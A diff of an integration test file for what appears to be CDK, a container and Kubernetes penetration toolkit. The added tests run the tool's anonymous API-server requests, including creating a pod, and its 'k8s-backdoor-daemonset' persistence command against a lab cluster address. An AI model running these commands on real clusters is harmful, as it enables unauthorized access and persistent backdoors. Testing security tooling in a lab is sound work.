@@ -1,9 +1,12 @@
+import shlex
 import time
+import os
 from lib.ssh_remote_action import update_remote_bin
 from lib.ssh_remote_action import check_host_evaluate
 from lib.ssh_remote_action import inside_container_cmd
 from lib.ssh_remote_action import check_host_exec
 from lib.k8s_remote_action import check_pod_exec, k8s_pod_upload
+from lib.conf import CDK
 
 
 def test_all():
@@ -193,7 +196,7 @@ def test_all():
         image='ubuntu:latest',
         docker_args='',
         cmd='nc',
-        white_list=['input args'],
+        white_list=['options'],
         black_list=['i@cdxy.me'],
         verbose=False
     )
@@ -462,7 +465,7 @@ def test_all():
         False
     )
 
-    # tool: kcurl # TODO test post args.
+    # tool: kcurl
     check_pod_exec(
         'kcurl',
         ['to K8s api-server'], # help msg
@@ -476,20 +479,48 @@ def test_all():
         False
     )
     check_pod_exec(
-        'kcurl default get http://172.21.0.1:443/api/v1/nodes', # empty response
-        ['empty'],
-        ['panic:', 'cdk evaluate'],
-        False
-    )
-    check_pod_exec(
         'kcurl anonymous get https://172.21.0.1:443/api/v1/nodes', # success dump
         ['apiVersion'],
         ['panic:', 'nodes is forbidden','cdk evaluate','empty'],
         False
     )
+    check_pod_exec(
+        r'''
+        kcurl anonymous post 'https://172.21.0.1:443/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply' '{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"cdxy-test-2021\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"ubuntu:latest\",\"name\":\"container\"}]}}\n"},"name":"cdxy-test-2021","namespace":"default"},"spec":{"containers":[{"image":"ubuntu:latest","name":"container"}]}}'
+        '''.replace('\n',''),
+        ['apiVersion','api-server response'],
+        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
+        False
+    )
+
+    # run: k8s-backdoor-daemonset
+    check_pod_exec(
+        'run k8s-backdoor-daemonset 1', # success dump
+        ['invalid'],
+        ['panic:', 'nodes is forbidden','cdk evaluate','empty'],
+        False
+    )
+    check_pod_exec(
+        'run k8s-backdoor-daemonset anonymous ubuntu',  # success dump
+        ['cdk-backdoor-daemonset'],
+        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
+        False
+    )
+
 
 def test_dev():
-    pass
+    check_pod_exec(
+        'run k8s-backdoor-daemonset 1', # success dump
+        ['invalid'],
+        ['panic:', 'nodes is forbidden','cdk evaluate','empty'],
+        False
+    )
+    check_pod_exec(
+        'run k8s-backdoor-daemonset anonymous ubuntu',  # success dump
+        ['cdk-backdoor-daemonset'],
+        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
+        True
+    )
 
 
 def clear_all_container():
@@ -497,9 +528,15 @@ def clear_all_container():
 
 
 if __name__ == '__main__':
+    # build
+    os.system(CDK.BUILD_CMD)
+
+    # upload
     update_remote_bin()
     k8s_pod_upload()
-    test_dev()
+
+    # test
+    # test_dev()
 
     test_all()
     clear_all_container()
